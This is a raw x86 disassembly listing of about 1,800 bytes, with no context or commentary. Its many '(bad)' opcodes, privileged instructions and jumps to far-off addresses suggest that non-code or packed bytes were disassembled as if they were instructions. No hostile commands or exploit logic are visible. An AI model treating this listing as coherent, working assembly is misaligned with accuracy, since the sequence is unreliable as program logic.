  42a97e:	mov    edx,DWORD PTR [ebp-0x8]
  42a981:	mov    ecx,DWORD PTR [ebp-0x4]
  42a984:	add    DWORD PTR [ebp-0x18],0xffffff8d
  42a988:	inc    DWORD PTR [eax+esi*8]
  42a98b:	inc    ebp
  42a98c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a98d:	mov    edx,DWORD PTR [ebp+0x1c]
  42a990:	add    DWORD PTR [ebp-0x14],eax
  42a993:	mov    edx,DWORD PTR [ebp-0x70]
  42a996:	cmp    eax,DWORD PTR [eax]
  42a998:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a999:	mov    eax,DWORD PTR [eax]
  42a99b:	sbb    al,0x73
  42a99d:	add    BYTE PTR [ebx],0x1
  42a9a0:	hlt    
  42a9a1:	add    BYTE PTR [eax+0x30],dl
  42a9a4:	mov    DWORD PTR [ecx],esi
  42a9a6:	hlt    
  42a9a7:	pop    ds
  42a9a8:	inc    ebp
  42a9a9:	xor    al,BYTE PTR [ebp+0x6c760f3a]
  42a9af:	(bad)  
  42a9b0:	push   DWORD PTR [edi]
  42a9b2:	mov    ecx,DWORD PTR [ebx+0x398503a4]
  42a9b8:	push   DWORD PTR [ebx-0x1]
  42a9bb:	mov    eax,DWORD PTR [ebp-0x740075]
  42a9c1:	sub    eax,DWORD PTR [eax]
  42a9c3:	add    eax,DWORD PTR [eax]
  42a9c5:	mov    DWORD PTR [ecx+0x5f],eax
  42a9c8:	mov    DWORD PTR [ebx+0x20],ebx
  42a9cb:	ret    0xff
  42a9ce:	mov    ecx,DWORD PTR [ebx+0x1cc783dc]
  42a9d4:	ret    
  42a9d5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  42a9db:	add    BYTE PTR [ebp-0x7d],al
  42a9de:	mov    DWORD PTR [eax],eax
  42a9e0:	sub    BYTE PTR [edi+edi*8+0x18008d01],al
  42a9e7:	sar    bh,cl
  42a9e9:	test   BYTE PTR [eax+0x1],dl
  42a9ec:	inc    ebp
  42a9ed:	add    BYTE PTR [ebx],dh
  42a9ef:	test   BYTE PTR [ebx],0x84
  42a9f2:	push   eax
  42a9f3:	add    BYTE PTR [ebp+0x0],al
  42a9f6:	add    eax,0x86
  42a9fb:	add    BYTE PTR [ebx-0x7f7be340],cl
  42aa01:	add    BYTE PTR [ecx],al
  42aa03:	add    BYTE PTR [eax],al
  42aa05:	mov    esi,0x550030
  42aa0a:	mov    ecx,DWORD PTR [edi]
  42aa0c:	sbb    al,0xda
  42aa0e:	jne    0x42aa10
  42aa10:	mov    edi,DWORD PTR [ecx]
  42aa12:	xor    BYTE PTR [eax+eax*1],0x84
  42aa16:	add    eax,DWORD PTR [eax]
  42aa18:	cld    
  42aa19:	add    BYTE PTR [ebp-0x4f],dh
  42aa1c:	mov    eax,DWORD PTR [ecx]
  42aa1e:	cld    
  42aa1f:	add    BYTE PTR [ecx-0x1bff009b],cl
  42aa25:	retf   0xe45
  42aa28:	add    eax,edx
  42aa2a:	sbb    al,0xb7
  42aa2c:	dec    ebp
  42aa2d:	or     al,0x89
  42aa2f:	dec    ebp
  42aa30:	sbb    al,0xf
  42aa32:	inc    ebp
  42aa33:	dec    eax
  42aa34:	mov    eax,DWORD PTR [ebx]
  42aa36:	sbb    al,0xf
  42aa38:	nop
  42aa39:	scas   al,BYTE PTR es:[edi]
  42aa3a:	add    DWORD PTR [eax],eax
  42aa3c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  42aa42:	mov    eax,gs
  42aa44:	add    bh,bh
  42aa46:	mov    edi,edi
  42aa48:	cmp    DWORD PTR [edi+0x72],edx
  42aa4b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  42aa51:	gs cmp al,0x0
  42aa54:	je     0x42aa2c
  42aa56:	push   eax
  42aa57:	sar    BYTE PTR [eax],1
  42aa59:	mov    bh,0x3e
  42aa5b:	push   cs
  42aa5c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  42aa62:	add    DWORD PTR [ecx+0x12],ebp
  42aa65:	dec    edx
  42aa66:	(bad)  
  42aa67:	mov    eax,edx
  42aa69:	in     al,dx
  42aa6a:	adc    DWORD PTR [ecx],esi
  42aa6c:	pop    esi
  42aa6d:	inc    ecx
  42aa6e:	leave  
  42aa6f:	or     DWORD PTR [eax],ebx
  42aa71:	gs push ebp
  42aa73:	add    ah,ch
  42aa75:	into   
  42aa76:	in     al,dx
  42aa77:	enter  0xb756,0xf0
  42aa7b:	push   cs
  42aa7c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  42aa86:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  42aa8c:	jnp    0x74432f94
  42aa92:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  42aa98:	add    BYTE PTR [edi],cl
  42aa9a:	mov    edi,DWORD PTR [ecx-0x78]
  42aa9d:	ltr    WORD PTR [ecx-0x7b]
  42aaa1:	dec    DWORD PTR [edi]
  42aaa3:	clc    
  42aaa4:	out    0x45,eax
  42aaa6:	add    BYTE PTR [eax],cl
  42aaa8:	cmp    ebx,0xffffff8c
  42aaab:	jge    0x42aaad
  42aaad:	jb     0x42aabf
  42aaaf:	je     0x51ab2f
  42aab5:	pop    edx
  42aab6:	push   esi
  42aab7:	mov    ecx,DWORD PTR [edi]
  42aab9:	in     al,dx
  42aaba:	rol    DWORD PTR [ebp+0x0],1
  42aabd:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  42aac4:	cmp    DWORD PTR [ecx],0xfffffff0
  42aac7:	hlt    
  42aac8:	mov    esp,DWORD PTR [eax+0xf034d2b]
  42aace:	(bad)  
  42aad0:	push   eax
  42aad1:	jns    0xb8428f4f
  42aad7:	lock push cs
  42aad9:	ror    edx,0x3
  42aadc:	test   BYTE PTR [ecx+0x5500e800],cl
  42aae2:	dec    eax
  42aae3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  42aae7:	(bad)  
  42aae8:	mov    esi,0x7f33ff5f
  42aaed:	inc    eax
  42aaee:	test   DWORD PTR [edx],eax
  42aaf0:	je     0x42aab2
  42aaf2:	mov    ecx,ecx
  42aaf4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  42aaf8:	and    eax,DWORD PTR [eax+0xf0103]
  42aafe:	jp     0x42aaec
  42ab00:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  42ab04:	add    edx,DWORD PTR [edi+0x74]
  42ab07:	sbb    BYTE PTR [ebp+0x4d001484],cl
  42ab0d:	add    BYTE PTR [ebp-0x74c48bbb],al
  42ab13:	je     0x42aa98
  42ab15:	cmp    eax,edi
  42ab17:	js     0x42ab3c
  42ab19:	add    eax,0xeb0fc003
  42ab1e:	jns    0x42aaab
  42ab20:	vmread DWORD PTR [ecx+0x45],ebx
  42ab24:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  42ab2a:	adc    al,0x8b
  42ab2c:	jge    0x42ab42
  42ab2e:	mov    edi,DWORD PTR [eax-0x4]
  42ab31:	add    edi,DWORD PTR [edi]
  42ab33:	or     bh,bh
  42ab35:	push   ebp
  42ab36:	push   es
  42ab37:	mov    DWORD PTR [ebp-0x4],ebx
  42ab3a:	add    edi,esi
  42ab3c:	pop    es
  42ab3d:	add    esi,DWORD PTR [edi-0x48ccf183]
  42ab43:	mov    DWORD PTR [esp+esi*8],ecx
  42ab46:	inc    ebp
  42ab47:	pop    ebp
  42ab48:	xor    DWORD PTR [esi-0x4],0x3b
  42ab4c:	add    edx,DWORD PTR [ecx+edi*1]
  42ab4f:	push   es
  42ab50:	clc    
  42ab51:	mov    bh,0xdb
  42ab53:	jp     0x42ab0c
  42ab55:	add    cl,BYTE PTR [esi]
  42ab57:	div    DWORD PTR [edi+0x4d8b0c1c]
  42ab5d:	test   edi,edi
  42ab5f:	je     0x42ab55
  42ab61:	mov    eax,ecx
  42ab63:	or     BYTE PTR [ebx],al
  42ab65:	dec    BYTE PTR [ecx+0x7d3bec7d]
  42ab6b:	jbe    0x42abdf
  42ab6d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  42ab73:	add    ecx,DWORD PTR [esi]
  42ab75:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  42ab7b:	add    eax,DWORD PTR [ebx-0x287af783]
  42ab81:	je     0x42abd0
  42ab83:	mov    DWORD PTR [ecx],edi
  42ab85:	mov    esi,eax
  42ab87:	hlt    
  42ab88:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  42ab8f:	jb     0x42ab51
  42ab91:	jmp    0x42ab7e
  42ab93:	xor    esi,DWORD PTR [ebx]
  42ab95:	pop    edi
  42ab96:	pop    esi
  42ab97:	pop    ebx
  42ab98:	ret    
  42ab99:	ret    0x8b
  42ab9c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  42aba2:	xor    DWORD PTR ds:0x89339c0c,0x56
  42aba9:	cld    
  42abaa:	cmp    DWORD PTR [ebp+0xf],eax
  42abad:	xor    al,0x85
  42abaf:	pushf  
  42abb0:	add    BYTE PTR [ebx+0x4d0cfc8b],cl
  42abb6:	ret    
  42abb7:	mov    edi,DWORD PTR [esi-0x4]
  42abba:	pop    eax
  42abbb:	dec    ebp
  42abbc:	jne    0x42ab49
  42abbe:	xor    edi,esp
  42abc0:	inc    eax
  42abc1:	dec    ebp
  42abc2:	jbe    0x42ac17
  42abc4:	inc    eax
  42abc5:	pop    ebp
  42abc6:	add    edx,DWORD PTR [esi+0x8]
  42abc9:	push   edi
  42abca:	dec    eax
  42abcb:	push   ecx
  42abcc:	mov    eax,edi
  42abce:	and    al,0xf0
  42abd0:	jo     0x42abbd
  42abd2:	mov    eax,DWORD PTR [ebx]
  42abd4:	sbb    BYTE PTR [ebp+0x4d],cl
  42abd7:	mov    eax,DWORD PTR [ebx]
  42abd9:	nop
  42abda:	or     BYTE PTR [eax],al
  42abdc:	jne    0x42ac35
  42abde:	cmp    ebx,DWORD PTR [esi+0x33893277]
  42abe4:	cld    
  42abe5:	xor    edi,edi
  42abe7:	add    edi,DWORD PTR [ebp+0x3]
  42abea:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  42abf0:	js     0x42ab76
  42abf2:	jae    0x42abf6
  42abf4:	(bad)  
  42abf6:	xor    al,0x5d
  42abf8:	jmp    0x42ab85
  42abfa:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  42ac01:	fdecstp 
  42ac03:	test   BYTE PTR [edi],ah
  42ac05:	add    bh,BYTE PTR [ebp+0x0]
  42ac08:	add    ebx,DWORD PTR [ebp-0x77]
  42ac0b:	mov    edi,eax
  42ac0d:	cmp    al,0x0
  42ac10:	adc    dh,BYTE PTR [ebx]
  42ac12:	jge    0x42ac17
  42ac14:	mov    edi,DWORD PTR [ebx]
  42ac16:	jl     0x42ac27
  42ac18:	clc    
  42ac19:	dec    edi
  42ac1a:	jge    0x42ac1c
  42ac1c:	mov    eax,DWORD PTR [ebx]
  42ac1e:	jb     0x42ac28
  42ac20:	mov    ecx,DWORD PTR [ebp-0x8]
  42ac23:	mov    edi,edi
  42ac25:	xor    edx,DWORD PTR [eax]
  42ac27:	add    edi,DWORD PTR [ebx]
  42ac29:	mov    DWORD PTR [ebp-0x10],edi
  42ac2c:	inc    edi
  42ac2d:	pop    ebp
  42ac2e:	jge    0x42ac6b
  42ac30:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  42ac34:	mov    edx,0xc05d87f0
  42ac39:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  42ac3d:	fimul  WORD PTR [eax]
  42ac3f:	fist   WORD PTR [ebp+0x1c]
  42ac42:	in     al,dx
  42ac43:	jne    0x42ac31
  42ac45:	mov    edi,DWORD PTR [edx-0x7a27a10]
  42ac4b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  42ac4f:	fdivp  st(0),st
  42ac51:	fild   WORD PTR [ebp+0x4510f85c]
  42ac57:	test   BYTE PTR [ebx+0x4d00fc02],cl
  42ac5d:	inc    ebp
  42ac5e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  42ac64:	mov    ebp,DWORD PTR [ebx-0x4]
  42ac67:	adc    al,0x8b
  42ac69:	rcl    DWORD PTR [eax],0x48
  42ac6c:	mov    esi,0x7080803
  42ac71:	fiadd  WORD PTR [ebp+0x4d]
  42ac74:	(bad)  
  42ac75:	mov    edx,DWORD PTR [edx-0x4]
  42ac78:	mov    edx,DWORD PTR [ebp-0x4]
  42ac7b:	xor    ebx,DWORD PTR [ebx+0x330103]
  42ac81:	mov    DWORD PTR [edi+0x872dc],edi
  42ac87:	xlat   BYTE PTR ds:[ebx]
  42ac88:	into   
  42ac89:	ffreep st(6)
  42ac8b:	retf   0x6c7
  42ac8e:	iret   
  42ac8f:	dec    ebp
  42ac90:	inc    ebp
  42ac91:	mov    DWORD PTR [ebx],edi
  42ac93:	fmul   QWORD PTR [edi]
  42ac95:	dec    ebp
  42ac96:	jnp    0x42accb
  42ac98:	add    BYTE PTR [ebx],al
  42ac9a:	mov    ecx,DWORD PTR [esp+edi*8]
  42ac9d:	inc    ebp
  42ac9e:	dec    ebp
  42ac9f:	lea    esi,[ebx]
  42aca1:	add    DWORD PTR [ebx],eax
  42aca3:	jb     0x42ace0
  42aca5:	add    BYTE PTR [edi],cl
  42aca7:	inc    ebp
  42aca8:	imul   eax,edi,0x858bd800
  42acae:	cld    
  42acaf:	clc    
  42acb0:	mov    DWORD PTR [ebp+0x0],eax
  42acb3:	inc    DWORD PTR [eax]
  42acb5:	or     al,0xde
  42acb7:	sbb    bh,0x1
  42acba:	retf   
  42acbb:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  42acc2:	dec    ebp
  42acc3:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  42acc9:	enter  0x12de,0xdf
  42accd:	inc    ebp
  42acce:	pop    ebp
  42accf:	dec    DWORD PTR [ebx-0x257f0ff4]
  42acd5:	add    DWORD PTR [edx],edx
  42acd7:	add    BYTE PTR [ebp+0x50],dl
  42acda:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  42ace0:	xor    ecx,DWORD PTR [ebx+eax*1+0xac73966]
  42ace7:	loopne 0x42ad00
  42ace9:	cdq    
  42acea:	push   ebp
  42aceb:	clc    
  42acec:	mov    eax,DWORD PTR [ebp-0x4]
  42acef:	xor    edx,edx
  42acf1:	add    esi,DWORD PTR [ebx]
  42acf3:	cmp    eax,DWORD PTR [ebx]
  42acf5:	hlt    
  42acf6:	cmp    DWORD PTR [ebx],esp
  42acf8:	or     al,BYTE PTR [ebp+0xf]
  42acfb:	mov    eax,DWORD PTR [edx]
  42acfd:	loopne 0x42acff
  42acff:	(bad)  
  42ad00:	mov    ecx,esi
  42ad02:	cld    
  42ad03:	pushf  
  42ad04:	pop    ebp
  42ad05:	sahf   
  42ad06:	mov    esi,DWORD PTR [edx]
  42ad08:	lock mov eax,eax
  42ad0b:	adc    BYTE PTR [ebx],al
  42ad0d:	or     BYTE PTR [ebx+0x4d001001],0xcf
  42ad14:	xor    ebp,DWORD PTR [edi+0x50e45189]
  42ad1a:	dec    ebp
  42ad1b:	mov    ecx,DWORD PTR [ebx-0x31390304]
  42ad21:	(bad)  
  42ad22:	iret   
  42ad23:	inc    ebp
  42ad24:	(bad)  
  42ad25:	jne    0x42ad74
  42ad27:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  42ad2d:	(bad)  
  42ad2e:	cmp    ebx,eax
  42ad30:	je     0x42acb8
  42ad32:	add    edi,edi
  42ad34:	or     bh,bh
  42ad36:	dec    ebp
  42ad37:	inc    ebp
  42ad38:	mov    esi,DWORD PTR [ebx]
  42ad3a:	cld    
  42ad3b:	add    ecx,esi
  42ad3d:	cmp    ecx,DWORD PTR [eax-0xc]
  42ad40:	mov    edx,DWORD PTR [edi]
  42ad42:	or     BYTE PTR [ebp-0x7c],al
  42ad45:	mov    ebx,DWORD PTR [esi-0x7639cd18]
  42ad4b:	test   BYTE PTR [esi+ebx*4],cl
  42ad4e:	inc    ebp
  42ad4f:	xor    dh,BYTE PTR [eax]
  42ad51:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  42ad58:	jne    0x42ad21
  42ad5a:	mov    ebp,esp
  42ad5c:	fcomp  DWORD PTR [ebx]
  42ad5e:	add    BYTE PTR [ecx],al
  42ad60:	inc    DWORD PTR [ebp-0x75]
  42ad63:	(bad)  
  42ad64:	cld    
  42ad65:	add    al,0xce
  42ad67:	mov    ecx,edi
  42ad69:	cld    
  42ad6a:	inc    ebp
  42ad6b:	fidivr WORD PTR [ebx]
  42ad6d:	fbstp  TBYTE PTR [ebp-0x3e]
  42ad70:	mov    eax,DWORD PTR [eax]
  42ad72:	adc    BYTE PTR [ebx-0x3974038b],cl
  42ad78:	fadd   st,st(7)
  42ad7a:	add    BYTE PTR [ebp-0x1],al
  42ad7d:	mov    ecx,DWORD PTR [esp+edi*8]
  42ad80:	inc    ebp
  42ad81:	mov    bh,0xc7
  42ad84:	loopne 0x42adcb
  42ad86:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  42ad8c:	sbb    al,0x33
  42ad8e:	pushf  
  42ad8f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  42ad95:	mov    eax,edi
  42ad97:	cwde   
  42ad98:	inc    ebp
  42ad99:	inc    ebp
  42ad9a:	jne    0x42ad27
  42ad9c:	mov    esp,esp
  42ad9e:	clc    
  42ad9f:	add    al,0x4d
  42ada1:	mov    DWORD PTR [ebx],esi
  42ada3:	or     al,0x33
  42ada5:	inc    ebp
  42ada6:	lea    ecx,[ebx-0x398d13fd]
  42adac:	add    bh,al
  42adae:	inc    ebp
  42adaf:	ror    DWORD PTR [ebx+0x45d829],0x8b
  42adb6:	add    ebp,esp
  42adb8:	shufps xmm1,xmm3,0xc7
  42adbc:	(bad)  
  42adbd:	jmp    0x7487e8e6
  42adc2:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  42adc8:	hlt    
  42adc9:	mov    ecx,DWORD PTR [edi]
  42adcb:	fadd   DWORD PTR [ebp+0x0]
  42adce:	xor    ecx,DWORD PTR [edi]
  42add0:	add    ecx,ecx
  42add2:	cmp    edi,edi
  42add4:	pmuludq mm7,QWORD PTR [edx+0x50]
  42add8:	(bad)  
  42add9:	jmp    0x42ad66
  42addb:	mov    edi,esp
  42addd:	or     al,0xc6
  42addf:	inc    ebp
  42ade0:	(bad)  
  42ade1:	mov    eax,DWORD PTR [ebp+0x10]
  42ade4:	jne    0x42ad6f
  42ade6:	mov    eax,DWORD PTR [ecx]
  42ade8:	clc    
  42ade9:	add    BYTE PTR [ebp-0x40],cl
  42adec:	xor    edx,DWORD PTR [eax-0x73]
  42adef:	jne    0x42adf2
  42adf1:	push   DWORD PTR [edx+0x8]
  42adf4:	add    BYTE PTR [ebp+0x45],al
  42adf7:	mov    ebp,ecx
  42adf9:	cld    
  42adfa:	add    BYTE PTR [ebp+0x0],cl
  42adfd:	xor    eax,DWORD PTR [ebp+0x3]
  42ae00:	lea    edi,[ebx]
  42ae02:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  42ae08:	sub    eax,0x5d330e4d
  42ae0d:	lea    esi,[ebx]
  42ae0f:	add    DWORD PTR [ebx],eax
  42ae11:	jb     0x42adfc
  42ae13:	add    BYTE PTR [eax],al
  42ae15:	inc    ebp
  42ae16:	add    bl,ch
  42ae18:	inc    ebp
  42ae19:	mov    esi,DWORD PTR [ebx]
  42ae1b:	or     al,0x3
  42ae1d:	(bad)  
  42ae1e:	mov    edi,eax
  42ae20:	in     al,dx
  42ae21:	scas   eax,DWORD PTR es:[edi]
  42ae22:	inc    ebp
  42ae23:	mov    esi,DWORD PTR [ebx]
  42ae25:	in     al,0x3
  42ae27:	add    al,0x89
  42ae29:	mov    ecx,DWORD PTR [eax+edi*8]
  42ae2c:	dec    ebp
  42ae2d:	(bad)  
  42ae2e:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3162]
  42ae35:	mov    ecx,eax
  42ae37:	cld    
  42ae38:	push   es
  42ae39:	dec    ebp
  42ae3a:	add    al,0x33
  42ae3c:	mov    DWORD PTR [ebx],eax
  42ae3e:	in     al,dx
  42ae3f:	cmp    DWORD PTR [ebp-0x67],eax
  42ae42:	mov    eax,DWORD PTR [ebp-0xba0068]
  42ae48:	mov    edx,DWORD PTR [ebp-0x4]
  42ae4b:	mov    ecx,DWORD PTR [ebp-0x18]
  42ae4e:	xor    ecx,DWORD PTR [ebp+0x3]
  42ae51:	cmp    DWORD PTR [ebx],0x8b32749d
  42ae57:	xor    edi,esp
  42ae59:	jmp    0xff76abab
  42ae5e:	add    ecx,DWORD PTR [ebp-0x3f]
  42ae61:	xor    ebx,DWORD PTR [edi]
  42ae63:	add    eax,ecx
  42ae65:	cmp    ebx,DWORD PTR [eax]
  42ae67:	mov    ecx,DWORD PTR [ebp-0x4]
  42ae6a:	mov    ecx,DWORD PTR [eax]
  42ae6c:	adc    BYTE PTR [ebp-0x80],al
  42ae6f:	jmp    0x42ae72
  42ae71:	mov    eax,DWORD PTR [eax]
  42ae73:	cld    
  42ae74:	mov    bh,0xc6
  42ae76:	push   ecx
  42ae77:	(bad)  
  42ae78:	jne    0x42aed8
  42ae7a:	dec    ecx
  42ae7c:	or     BYTE PTR [ecx+ebx*1],cl
  42ae7f:	push   ebp
  42ae80:	inc    ebp
  42ae81:	in     al,dx
  42ae82:	add    ebp,esp
  42ae84:	or     bh,al
  42ae86:	dec    ebp
  42ae87:	cld    
  42ae88:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  42ae8e:	xor    DWORD PTR [edx+eax*1],0xffffff9c
  42ae92:	dec    DWORD PTR [ebx+0x45510cf4]
  42ae98:	mov    DWORD PTR [ebx+0x5745fc0c],ecx
  42ae9e:	mov    edx,DWORD PTR [ecx+0xc]
  42aea1:	xor    eax,esi
  42aea3:	mov    edx,0xc172c7
  42aea8:	inc    ebp
  42aea9:	mov    esi,DWORD PTR [ebp+0x8]
  42aeac:	mov    eax,edx
  42aeae:	call   0x84c775a3
  42aeb3:	add    DWORD PTR [esi-0x76bace00],ebx
  42aeb9:	mov    ebp,eax
  42aebb:	or     BYTE PTR [eax],dl
  42aebd:	jo     0x42af0c
  42aebf:	push   edi
  42aec0:	xor    esi,DWORD PTR [ebp+0x3]
  42aec3:	(bad)  
  42aec4:	pmulhuw mm0,mm1
  42aec7:	test   DWORD PTR [ebp-0x8],ecx
  42aeca:	mov    DWORD PTR [ebp-0x67],eax
  42aecd:	mov    eax,DWORD PTR [ebp-0x4]
  42aed0:	xor    edi,DWORD PTR [ebp-0x73]
  42aed3:	xor    eax,DWORD PTR [ebx]
  42aed5:	xor    esi,DWORD PTR [edx+0x3]
  42aed8:	add    BYTE PTR [ecx],bh
  42aeda:	inc    ebp
  42aedb:	(bad)  
  42aedc:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  42aee2:	mov    DWORD PTR [eax],0x750f0004
  42aee8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  42aeee:	lock add BYTE PTR [ebp+0x0],al
  42aef2:	mov    esi,DWORD PTR [ebp-0x2c]
  42aef5:	mov    ebp,edx
  42aef7:	or     al,0x72
  42aef9:	ja     0x42aefb
  42aefb:	mov    edx,esi
  42aefd:	cld    
  42aefe:	(bad)  
  42af01:	cli    
  42af02:	mov    esi,DWORD PTR [ebp-0x4]
  42af05:	cmp    ecx,esi
  42af07:	bswap  edi
  42af09:	(bad)
  42af0d:	mov    esi,DWORD PTR [ebp-0x4]
  42af10:	mov    esi,ecx
  42af12:	clc    
  42af13:	repnz add esi,DWORD PTR [ebp+0x45]
  42af17:	push   ebx
  42af18:	xor    eax,DWORD PTR [ebp+0x3]
  42af1b:	xor    bl,BYTE PTR [edi-0x64]
  42af1e:	pop    ebx
  42af1f:	jmp    0x42afe6
  42af24:	mov    esi,DWORD PTR [ebp-0x7d]
  42af27:	xor    ebp,DWORD PTR [eax]
  42af29:	lea    eax,[ebp-0x8]
  42af2c:	xor    eax,0xc7ef9cf2
  42af31:	neg    eax
  42af33:	ins    DWORD PTR es:[edi],dx
  42af34:	test   esi,edi
  42af36:	clc    
  42af37:	pop    esp
  42af38:	inc    ebp
  42af39:	or     BYTE PTR [ecx+0x450f0c7d],cl
  42af3f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  42af45:	add    cl,al
  42af47:	jne    0x42aee7
  42af49:	mov    esi,DWORD PTR [edx]
  42af4b:	in     al,dx
  42af4c:	push   esi
  42af4d:	xor    BYTE PTR [ebp-0xe],dh
  42af50:	add    edi,esi
  42af52:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  42af58:	add    cl,bh
  42af5a:	mov    edi,DWORD PTR [ebp+0x8]
  42af5d:	mov    DWORD PTR [ebp-0x14],esi
  42af60:	add    esi,DWORD PTR [ebp+0x3c]
  42af63:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  42af69:	mov    ah,0x30
  42af6b:	sahf   
  42af6c:	pushf  
  42af6d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  42af73:	jne    0x42af00
  42af75:	mov    ecx,DWORD PTR [esp+ebp*8]
  42af78:	icebp  
  42af79:	icebp  
  42af7a:	shl    edx,0xf2
  42af7d:	(bad)  
  42af7e:	mov    ah,0x16
  42af80:	push   0xf8b9375
  42af85:	in     al,dx
  42af86:	jmp    0x42af79
  42af88:	add    dl,dh
  42af8a:	mov    edi,esi
  42af8c:	or     al,0x8
  42af8e:	inc    ebp
  42af8f:	jne    0x42af94
  42af91:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  42af97:	ret    
  42af98:	or     bh,bh
  42af9a:	jge    0x42af84
  42af9c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  42afa2:	xor    edi,eax
  42afa4:	add    esi,DWORD PTR [ebp-0x77]
  42afa7:	mov    ebx,esp
  42afa9:	clc    
  42afaa:	neg    DWORD PTR [ebp-0x7c]
  42afad:	xor    eax,DWORD PTR [eax]
  42afaf:	cmp    eax,DWORD PTR [eax]
  42afb1:	repz jne 0x42af49
  42afb4:	xor    eax,DWORD PTR [ecx]
  42afb6:	add    ebx,DWORD PTR [eax]
  42afb8:	mov    DWORD PTR [ebp-0x8],eax
  42afbb:	mov    eax,edi
  42afbd:	cld    
  42afbe:	lock pop eax
  42afc0:	test   DWORD PTR [ebx],esi
  42afc2:	clc    
  42afc3:	add    edx,DWORD PTR [edi-0x740bff77]
  42afc9:	fdivp  st(4),st
  42afcb:	test   ecx,esi
  42afcd:	(bad)  
  42afce:	jnp    0x42afcf
  42afd0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  42afd6:	jae    0x42af63
  42afd8:	sub    edi,esp
  42afda:	(bad)  
  42afdb:	shl    DWORD PTR [eax-0x3e],0x89
  42afdf:	leave  
  42afe0:	call   0x819866ed
  42afe5:	in     al,dx
  42afe6:	(bad)  
  42afe7:	in     al,dx
  42afe8:	add    bh,al
  42afea:	mov    esp,edi
  42afec:	in     al,dx
  42afed:	test   DWORD PTR [ebp-0x8],edi
  42aff0:	mov    eax,DWORD PTR [ebp+0x2b]
  42aff3:	xor    al,0x3
  42aff5:	pushf  
  42aff6:	jnp    0x5731ac2f
  42affc:	xor    edx,DWORD PTR [edi-0x77]
  42afff:	push   ecx
  42b000:	loopne 0x42b035
  42b002:	jne    0x42afbf
  42b004:	mov    esi,DWORD PTR [edx-0x20]
  42b007:	add    BYTE PTR [ebp-0x3d],bh
  42b00a:	xor    eax,DWORD PTR [ebp-0x73]
  42b00d:	mov    edi,DWORD PTR [esi]
  42b00f:	cld    
  42b010:	jb     0x42afd8
  42b012:	add    bl,al
  42b014:	jne    0x42b05b
  42b016:	mov    edx,DWORD PTR [edi-0x10]
  42b019:	jge    0x42b098
  42b01b:	mov    esi,DWORD PTR [ebx]
  42b01d:	lock add ecx,DWORD PTR [ebp+0x3b]
  42b021:	xor    esi,DWORD PTR [ebp-0x77]
  42b024:	mov    esi,eax
  42b026:	lock inc ebp
  42b028:	jge    0x42b05f
  42b02a:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  42b031:	dec    ebp
  42b032:	mov    esi,DWORD PTR [ebx]
  42b034:	loopne 0x42afbf
  42b036:	jge    0x42b030
  42b038:	add    DWORD PTR [ebp-0x7d],eax
  42b03b:	cmc    
  42b03c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  42b043:	dec    ebp
  42b044:	hlt    
  42b045:	xor    ebx,DWORD PTR [ebp-0x77]
  42b048:	mov    esi,esp
  42b04a:	in     al,0x45
  42b04c:	jge    0x42b07f
  42b04e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  42b055:	dec    ebp
  42b056:	ins    BYTE PTR es:[edi],dx
  42b057:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  42b05d:	inc    ebp
  42b05e:	hlt    
  42b05f:	xor    eax,0xb88b9f75
  42b064:	add    al,0x95
  42b066:	icebp  
  42b067:	add    dl,dh
  42b069:	mov    DWORD PTR [ebp+0x20],ebx
  42b06c:	cmp    eax,DWORD PTR [ebp+0xf]
  42b06f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  42b073:	fistp  WORD PTR [ebx+0x0]
  42b076:	inc    ebp
  42b077:	mov    ebx,DWORD PTR [edi+0xc]
  42b07a:	add    eax,eax
  42b07c:	inc    ebp
  42b07d:	test   BYTE PTR [ebx],dh
  42b07f:	add    eax,DWORD PTR [ebx]
  42b081:	add    BYTE PTR [esi+0x45],bl
  42b084:	ret    0x85
  42b087:	jnp    0x54433456
  42b08d:	inc    bp
  42b08f:	inc    ebp
  42b090:	xor    eax,0xc78a9cb9
